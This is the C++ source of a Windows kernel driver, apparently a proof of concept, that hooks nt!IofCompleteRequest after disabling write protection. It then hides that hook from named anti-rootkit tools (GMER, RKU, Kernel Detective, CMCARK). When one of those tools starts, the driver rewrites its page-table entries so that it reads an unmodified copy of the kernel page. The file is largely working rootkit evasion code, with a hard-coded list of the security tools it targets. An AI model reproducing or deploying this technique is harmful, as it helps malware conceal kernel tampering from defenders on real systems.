#include "stdafx.h"
#include "memory.h"

extern "C"
{
NTSYSAPI 
BOOLEAN
NTAPI
FsRtlIsNameInExpression(
    PUNICODE_STRING Expression,
    PUNICODE_STRING Name,
    BOOLEAN IgnoreCase,
    PWCH UpcaseTable
); 
}

typedef NTSTATUS (__fastcall * func_IofCompleteRequest)(
    PIRP Irp,
    CCHAR PriorityBoost
);

// virtual memory page size
#define PAGE_SIZE 0x1000

#define PAGE_SIZE_2M (1024 * 1024 * 2)

ULONG m_PhysicalPageSize = 0;

PVOID m_KernelBase = NULL;
ULONG m_KernelSize = 0;

PVOID m_TargetAddr = NULL;
ULONG m_TargetSize = 0;

MAPPED_MDL m_TargetMemContents;
PHYSICAL_ADDRESS m_TargetMemPhysicalAddr;

// stuff for function code patching
func_IofCompleteRequest old_IofCompleteRequest = NULL;
ULONG IofCompleteRequest_BytesPatched = 0;
func_IofCompleteRequest f_IofCompleteRequest = NULL;

/*
    List of known antirootkits to bypass
*/
PWSTR m_wcKnownProcesses[] = 
{
    L"*\\RKU*.EXE",
    L"*\\KERNEL DETECTIVE.EXE",
    L"*\\GMER.EXE",
    L"*\\CMCARK*.EXE"
};

typedef struct _PROCESSES_LIST_ENTRY
{
    _PROCESSES_LIST_ENTRY *next, *prev;
    PEPROCESS Process;

} PROCESSES_LIST_ENTRY,
*PPROCESSES_LIST_ENTRY;

PPROCESSES_LIST_ENTRY process_list_head = NULL, process_list_end = NULL;
KSPIN_LOCK m_ListLock;
//--------------------------------------------------------------------------------------
BOOLEAN AllocateKernelMemory(ULONG Size, PMAPPED_MDL MdlInfo)
{
    MdlInfo->Mdl = NULL;
    MdlInfo->Buffer = NULL;
    MdlInfo->MappedBuffer = NULL;

    // allocate kernel-mode buffer in non-paged pool
    PVOID Buffer = M_ALLOC(Size);
    if (Buffer)
    {
        // allocate memory descriptor
        PMDL Mdl = IoAllocateMdl(Buffer, Size, FALSE, FALSE, NULL);
        if (Mdl)
        {
            __try
            {
                // lock allocated pages
                MmProbeAndLockPages(Mdl, KernelMode, IoWriteAccess);
            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): MmProbeAndLockPages() EXCEPTION\n");

                IoFreeMdl(Mdl);
                M_FREE(Buffer);

                return FALSE;
            }

            // map allocated pages into the kernel space
            PVOID MappedBuffer = MmMapLockedPagesSpecifyCache(
                Mdl, 
                KernelMode, 
                MmCached, 
                NULL, 
                FALSE, 
                NormalPagePriority
            );
            if (MappedBuffer)
            {
                MdlInfo->Mdl = Mdl;
                MdlInfo->Buffer = Buffer;
                MdlInfo->MappedBuffer = MappedBuffer;

                return TRUE;   
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): MmMapLockedPagesSpecifyCache() fails\n");
            }

            MmUnlockPages(Mdl);
            IoFreeMdl(Mdl);
        } 
        else
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): IoAllocateMdl() fails\n");
        }

        M_FREE(Buffer);
    }    
    else
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): M_ALLOC() fails\n");
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
void FreeKernelMemory(PMAPPED_MDL MdlInfo)
{
    // unmap user-mode address
    MmUnmapLockedPages(MdlInfo->MappedBuffer, MdlInfo->Mdl);

    // unlock pages
    MmUnlockPages(MdlInfo->Mdl);

    // free memory descriptor
    IoFreeMdl(MdlInfo->Mdl);

    // free buffer
    M_FREE(MdlInfo->Buffer);
}
//--------------------------------------------------------------------------------------
void CopyKernelMemory(PVOID Dst, PVOID Src, ULONG Size)
{
    for (ULONG i = 0; i < Size; i++)
    {
        if (MmIsAddressValid((PVOID)((PUCHAR)Src + i)))
        {
            *((PUCHAR)Dst + i) = *((PUCHAR)Src + i);
        }
    }
}
//--------------------------------------------------------------------------------------
BOOLEAN AllocatePteTable(PVOID *Address, PULONG PfnValue)
{
    ULONG PfnList[1];
    MAPPED_MDL MdlInfo;

    if (AllocateKernelMemory(PAGE_SIZE, &MdlInfo))
    {
        memset(MdlInfo.MappedBuffer, 0, PAGE_SIZE);

        PHYSICAL_ADDRESS MemAddr = MmGetPhysicalAddress(MdlInfo.MappedBuffer);

        *PfnValue = (ULONG)(MemAddr.QuadPart >> PAGE_SHIFT);
        *Address = MdlInfo.MappedBuffer;

        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): "IFMT" (PFN=0x%.8x)\n", *Address, *PfnValue);

        return TRUE;
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
BOOLEAN SetPfnForPagePae(PVOID Pointer, PHYSICAL_ADDRESS *PhysicalAddr)
{
    MMPTE_PAE *Pde = MiGetPdeAddressPae(Pointer);

    if (Pde->u.Hard.Valid)
    {
        MMPTE_PAE *Pte = NULL;
        BOOLEAN bFakePte = FALSE;

        DbgMsg(
            __FILE__, __LINE__, 
            "PDE entry 0x%.8x is valid, PTE PFN=0x%.8x\n", 
            Pde, Pde->u.Hard.PageFrameNumber
        );

        if (Pde->u.Hard.LargePage != 0)
        {
            // This is a large 2M page
            DbgMsg(__FILE__, __LINE__, "[!] PDE entry 0x%.8x points to large 2M page\n", Pde);

            PVOID NewTable = NULL;
            ULONG NewTablePfn = 0;
            
            // allocate new PTE table
            if (AllocatePteTable(&NewTable, &NewTablePfn))
            {
                /*
                    DIRTY HACK:
                    Convert one 2M page to 512 pages of 4K
                */
                for (ULONG i = 0; i < PAGE_SIZE / sizeof(ULONGLONG); i++)
                {
                    Pte = (MMPTE_PAE *)((PUCHAR)NewTable + i * sizeof(ULONGLONG));

                    Pte->u.Hard.Valid    = 1;
                    Pte->u.Hard.Global   = 1;
                    Pte->u.Hard.Write    = 1;
                    Pte->u.Hard.Dirty    = Pde->u.Hard.Dirty;
                    Pte->u.Hard.Accessed = Pde->u.Hard.Accessed;
                    
                    Pte->u.Hard.PageFrameNumber = Pde->u.Hard.PageFrameNumber + i;
                }

                __asm cli;

                Pde->u.Hard.PageFrameNumber = NewTablePfn;
                Pde->u.Hard.LargePage = 0;                

                __asm sti;

                bFakePte = TRUE;
            }
            else
            {
                return FALSE;
            }

            ULONG PteNumber = ((ULONG)Pointer & 0x001FF000) >> PAGE_SHIFT;
            Pte = (MMPTE_PAE *)((PUCHAR)NewTable + PteNumber * sizeof(ULONGLONG));
        }
        else
        {
            // Small 4K page, get its PTE
            Pte = MiGetPteAddressPae(Pointer);
        }

        if (Pte->u.Hard.Valid)
        {
            DbgMsg(
                __FILE__, __LINE__, 
                "PTE entry 0x%.8x is valid, PFN=0x%.8x\n", 
                Pte, Pte->u.Hard.PageFrameNumber
            );
                        
            if (!bFakePte)
            {
                PVOID NewTable = NULL;
                ULONG NewTablePfn = 0;

                // allocate new PTE table
                if (AllocatePteTable(&NewTable, &NewTablePfn))
                {
                    PVOID OldTable = (PVOID)((ULONG)Pte & 0xFFFFF000);
                    memcpy(NewTable, OldTable, PAGE_SIZE);

                    // set up faked PFN into the PTE entry
                    Pte = (MMPTE_PAE *)((ULONG)NewTable + ((ULONG)Pte & 0x00000FFF));
                    Pte->u.Hard.PageFrameNumber = (ULONG)(PhysicalAddr->QuadPart >> PAGE_SHIFT);

                    __asm cli;

                    // set up faked PTE table PFN into the PDE entry
                    Pde->u.Hard.PageFrameNumber = NewTablePfn;

                    __asm sti;
                }
                else
                {
                    return FALSE;
                }
            }
            else
            {
                __asm cli;

                // fake PTE table allready has been allocated
                Pte->u.Hard.PageFrameNumber = (ULONG)(PhysicalAddr->QuadPart >> 12);

                __asm sti;
            }            

            return TRUE;
        }
        else
        {
            // PTE is not valid
            DbgMsg(__FILE__, __LINE__, "PTE entry 0x%.8x is not valid\n", Pte);
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "PDE entry 0x%.8x is not valid\n", Pde);
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
__declspec(naked) ULONG __stdcall GetCR4(void)
{    
    __asm 
    {
        // mov eax, cr4
        __emit  0x0F 
        __emit  0x20 
        __emit  0xE0
        ret
    }
}
//--------------------------------------------------------------------------------------
__declspec(naked) ULONG __stdcall GetCR3(void)
{    
    __asm 
    {
        // mov eax, cr3
        __emit  0x0F 
        __emit  0x20 
        __emit  0xD8
        ret
    }
}
//--------------------------------------------------------------------------------------
__declspec(naked) void __stdcall FlushTlbEntry(PVOID Address)
{    
    __asm 
    {
        mov     eax, Address
        invlpg  [eax]
        retn    4
    }
}
//--------------------------------------------------------------------------------------
BOOLEAN SetPfnsForAddress(PVOID Address, ULONG PagesCount, PHYSICAL_ADDRESS *PhysicalAddr)
{
    // check for aligned page address
    if ((ULONG)Address % PAGE_SIZE != 0)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Bad pointer passed\n");
        return FALSE;
    }

    PHYSICAL_ADDRESS PdeAddr = MmGetPhysicalAddress((PVOID)PDE_BASE_PAE);
    
    DbgMsg(
        __FILE__, __LINE__, 
        "Address: "IFMT" (Process="IFMT", PDE table is at 0x%.8x 0x%.8x`%.8x)\n", 
        Address, PsGetCurrentProcess(), PDE_BASE_PAE, PdeAddr.HighPart, PdeAddr.LowPart
    );

    KeSetSystemAffinityThread(0x00000001);

    BOOLEAN bPaeEnabled = (GetCR4() & PAE_ON);   
    PHYSICAL_ADDRESS PhysicalAddrPage;
    PhysicalAddrPage.QuadPart = PhysicalAddr->QuadPart;

    KIRQL OldIrql;
    KeRaiseIrql(DISPATCH_LEVEL, &OldIrql);

    // enumerate all needed pages
    for (ULONG i = 0; i < PagesCount; i++)
    {       
        PVOID Page = (PVOID)RVATOVA(Address, i * PAGE_SIZE);        

        if (bPaeEnabled) 
        {
            // query PTE PFN for single page
            if (!SetPfnForPagePae(Page, &PhysicalAddrPage))
            {
                KeLowerIrql(OldIrql);
                return FALSE;
            }
        }
        else
        {
            // only PAE mode suported
            KeLowerIrql(OldIrql);
            return FALSE;
        }

        PhysicalAddrPage.QuadPart += PAGE_SIZE;
    }   

    FlushTlbEntry(Address);

    KeLowerIrql(OldIrql);

    return TRUE;
}
//--------------------------------------------------------------------------------------
inline wchar_t chrlwr_w(wchar_t chr)
{
    if ((chr >= 'A') && (chr <= 'Z')) 
    {
        return chr + ('a'-'A');
    }

    return chr;
}
//--------------------------------------------------------------------------------------
BOOLEAN IsKnownProcess(PUNICODE_STRING usName)
{
    // enumerate known modules
    for (size_t i = 0; i < sizeof(m_wcKnownProcesses) / sizeof(PWSTR); i++)
    {
        UNICODE_STRING usExpression;
        RtlInitUnicodeString(&usExpression, m_wcKnownProcesses[i]);

        // match name by mask
        if (FsRtlIsNameInExpression(&usExpression, usName, TRUE, NULL))
        {
            return TRUE;
        }
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
PPROCESSES_LIST_ENTRY process_info_save(PEPROCESS Process)
{
    PPROCESSES_LIST_ENTRY ret = NULL;
    KIRQL OldIrql;
    KeAcquireSpinLock(&m_ListLock, &OldIrql);

    __try
    {
        // allocate single list entry
        PPROCESSES_LIST_ENTRY e = (PPROCESSES_LIST_ENTRY)M_ALLOC(sizeof(PROCESSES_LIST_ENTRY));
        if (e)
        {
            RtlZeroMemory(e, sizeof(PROCESSES_LIST_ENTRY));            

            ObReferenceObject(Process);
            e->Process = Process;            

            // add it to list
            if (process_list_end)
            {
                process_list_end->next = e;
                e->prev = process_list_end;
                process_list_end = e;
            } 
            else 
            {
                process_list_end = process_list_head = e;    
            }

            ret = e;
        }   
        else
        {
            DbgMsg(__FILE__, __LINE__, "M_ALLOC() fails\n");
        }
    }    
    __finally
    {
        KeReleaseSpinLock(&m_ListLock, OldIrql);
    }  

    return ret;
}
//--------------------------------------------------------------------------------------
PPROCESSES_LIST_ENTRY process_info_find(PEPROCESS Process)
{
    PPROCESSES_LIST_ENTRY ret = NULL;
    KIRQL OldIrql;
    KeAcquireSpinLock(&m_ListLock, &OldIrql);

    __try
    {
        PPROCESSES_LIST_ENTRY e = process_list_head;

        while (e)
        {
            if (e->Process == Process)
            {                
                ret = e;
                break;
            }

            e = e->next;
        }
    }    
    __finally
    {
        KeReleaseSpinLock(&m_ListLock, OldIrql);
    }

    return ret;
}
//--------------------------------------------------------------------------------------
void process_info_del(PPROCESSES_LIST_ENTRY e)
{
    KIRQL OldIrql;
    KeAcquireSpinLock(&m_ListLock, &OldIrql);

    __try
    {
        // delete single entry from list
        if (e->prev)
            e->prev->next = e->next;

        if (e->next)
            e->next->prev = e->prev;

        if (process_list_head == e)
            process_list_head = e->next;

        if (process_list_end == e)
            process_list_end = e->prev;

        ObDereferenceObject(e->Process);

        M_FREE(e);
    }    
    __finally
    {
        KeReleaseSpinLock(&m_ListLock, OldIrql);
    }
}
//--------------------------------------------------------------------------------------
void ProcessNotifyRoutine(HANDLE ParentId, HANDLE ProcessId, BOOLEAN Create)
{
    PPROCESSES_LIST_ENTRY e = NULL;

    // get process pointer
    PEPROCESS Process = NULL;
    NTSTATUS ns = PsLookupProcessByProcessId(ProcessId, &Process);
    if (NT_SUCCESS(ns))
    {  
        if (Create)
        {                           
            // get process image path
            UNICODE_STRING ImagePath;
            if (GetProcessFullImagePath(Process, &ImagePath))
            {                                
                if (IsKnownProcess(&ImagePath))
                {
                    DbgMsg(
                        __FILE__, __LINE__, "PROCESS: 0x%.8x PID=%.5d '%wZ'\n", 
                        Process, ProcessId, &ImagePath
                    );

                    KAPC_STATE ApcState;
                    KeStackAttachProcess(Process, &ApcState);       

                    // set faked PFN's for target module
                    if (SetPfnsForAddress(
                        m_TargetAddr, 
                        m_TargetSize / PAGE_SIZE, 
                        &m_TargetMemPhysicalAddr))
                    {
                        // save process info
                        e = process_info_save(Process);
                        DbgMsg(__FILE__, __LINE__, "Process page tables is modified!\n");
                    }

                    KeUnstackDetachProcess(&ApcState);
                }

                RtlFreeUnicodeString(&ImagePath);
            }            
        }
        else if (e = process_info_find(Process))
        {
            // delete saved process information entry
            process_info_del(e);
            DbgMsg(__FILE__, __LINE__, "PROCESS: "IFMT" (EXIT)\n", Process);
        }

        ObDereferenceObject(Process);
    } 
    else 
    {
        DbgMsg(__FILE__, __LINE__, "PsLookupProcessByProcessId() fails; status: 0x%.8x\n", ns);
    }    
}
//--------------------------------------------------------------------------------------
NTSTATUS __fastcall new_IofCompleteRequest(
    PIRP Irp,
    CCHAR PriorityBoost)
{
    /*
        Just a handler for a test hook
    */
    if (Irp->IoStatus.Status == STATUS_SUCCESS &&
        KeGetCurrentIrql() == PASSIVE_LEVEL)
    {
        PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp);
        if (Stack->MajorFunction == IRP_MJ_CREATE &&
            Stack->FileObject)
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): IRP_MJ_CREATE (DevObj="IFMT")\n", Stack->DeviceObject);            
        }
    }

    NTSTATUS ns = old_IofCompleteRequest(
        Irp,
        PriorityBoost
    );

    return ns;
}
//--------------------------------------------------------------------------------------
void DriverUnload(PDRIVER_OBJECT DriverObject)
{   
    DbgMsg(__FILE__, __LINE__, "DriverUnload()\n");    
    
    if (f_IofCompleteRequest &&
        old_IofCompleteRequest &&
        IofCompleteRequest_BytesPatched > 0)
    {        
        // disable memory write protection
        ForEachProcessor(ClearWp, NULL);                

        // remove hook
        RtlCopyMemory(f_IofCompleteRequest, old_IofCompleteRequest, IofCompleteRequest_BytesPatched);

        // enable memory write protection
        ForEachProcessor(SetWp, NULL);
    }

    LARGE_INTEGER Timeout = { 0 };
    Timeout.QuadPart = RELATIVE(SECONDS(1));
    KeDelayExecutionThread(KernelMode, FALSE, &Timeout);

    // remove notify routines
    PsSetCreateProcessNotifyRoutine(ProcessNotifyRoutine, TRUE);
}
//--------------------------------------------------------------------------------------
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{    
    DbgInit();
    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): '%wZ'\n", RegistryPath);  

    DriverObject->DriverUnload = DriverUnload;

    // query basic system information
    ULONG RetSize = 0;
    SYSTEM_BASIC_INFORMATION BasicInfo;
    NTSTATUS ns = ZwQuerySystemInformation(SystemBasicInformation, &BasicInfo, sizeof(BasicInfo), &RetSize);
    if (!NT_SUCCESS(ns))
    {
        DbgMsg(__FILE__, __LINE__, "ZwQuerySystemInformation() fails; status: 0x%.8x\n", ns);
        return STATUS_UNSUCCESSFUL;
    }

    m_PhysicalPageSize = BasicInfo.PhysicalPageSize;
    DbgMsg(__FILE__, __LINE__, "Physical page size is 0x%.8x\n", m_PhysicalPageSize);    

    // test for enabled PAE
    if (GetCR4() & PAE_ON)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): PAE is ON\n");
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: PAE must be enabled to run this PoC\n");
        return STATUS_UNSUCCESSFUL;
    }

    // find target module base
    m_KernelBase = KernelGetModuleBase("ntoskrnl.exe");
    if (m_KernelBase == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "KernelGetModuleBase() fails\n");
        return STATUS_UNSUCCESSFUL;
    }

    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)m_KernelBase + 
        ((PIMAGE_DOS_HEADER)m_KernelBase)->e_lfanew);

    m_KernelSize = XALIGN_UP(pHeaders->OptionalHeader.SizeOfImage, PAGE_SIZE);

    DbgMsg(__FILE__, __LINE__, "Kernel is at "IFMT" (0x%.8x bytes)\n", m_KernelBase, m_KernelSize);        

    // get address of nt!IofCompleteRequest()
    ULONG RVA = KernelGetExportAddress(m_KernelBase, "IofCompleteRequest");
    if (RVA == 0)
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: Unable to found nt!IofCompleteRequest()\n");
        return STATUS_UNSUCCESSFUL;
    }    

    // get address of nt!IofCompleteRequest()
    f_IofCompleteRequest = (func_IofCompleteRequest)RVATOVA(m_KernelBase, RVA);
    DbgMsg(__FILE__, __LINE__, "nt!IofCompleteRequest() is at "IFMT"\n", f_IofCompleteRequest);

    m_TargetAddr = (PVOID)XALIGN_DOWN((ULONG)f_IofCompleteRequest, PAGE_SIZE);
    m_TargetSize = PAGE_SIZE;
    
    DbgMsg(
        __FILE__, __LINE__, 
        "Target memory region is at "IFMT" (0x%.8x bytes)\n", 
        m_TargetAddr, m_TargetSize
    );        

    // allocate memory for faked data
    if (!AllocateKernelMemory(XALIGN_UP(m_TargetSize, PAGE_SIZE_2M), &m_TargetMemContents))
    {
        DbgMsg(__FILE__, __LINE__, "AllocateKernelMemory() fails\n");
        return STATUS_UNSUCCESSFUL;
    }

    CopyKernelMemory(m_TargetMemContents.MappedBuffer, m_TargetAddr, m_TargetSize);

    m_TargetMemPhysicalAddr = MmGetPhysicalAddress(m_TargetMemContents.MappedBuffer);
    
    DbgMsg(
        __FILE__, __LINE__, "Faked memory at "IFMT" (0x%.8x`%.8x)\n", 
        m_TargetMemContents.MappedBuffer, 
        m_TargetMemPhysicalAddr.HighPart, 
        m_TargetMemPhysicalAddr.LowPart
    );

    KeInitializeSpinLock(&m_ListLock);

    // set up notify on process creation
    ns = PsSetCreateProcessNotifyRoutine(ProcessNotifyRoutine, FALSE);
    if (!NT_SUCCESS(ns))
    {
        DbgMsg(__FILE__, __LINE__, "PsSetCreateProcessNotifyRoutine() fails; status: 0x%.8x\n", ns);        
        FreeKernelMemory(&m_TargetMemContents);
        return STATUS_UNSUCCESSFUL;
    }

    // disable memory write protection
    ForEachProcessor(ClearWp, NULL);                

    // set up our test hook
    old_IofCompleteRequest = (func_IofCompleteRequest)HookCode(
        f_IofCompleteRequest,
        new_IofCompleteRequest,
        &IofCompleteRequest_BytesPatched
    );

    // enable memory write protection
    ForEachProcessor(SetWp, NULL);  

    return STATUS_SUCCESS;
}
//--------------------------------------------------------------------------------------
// EoF
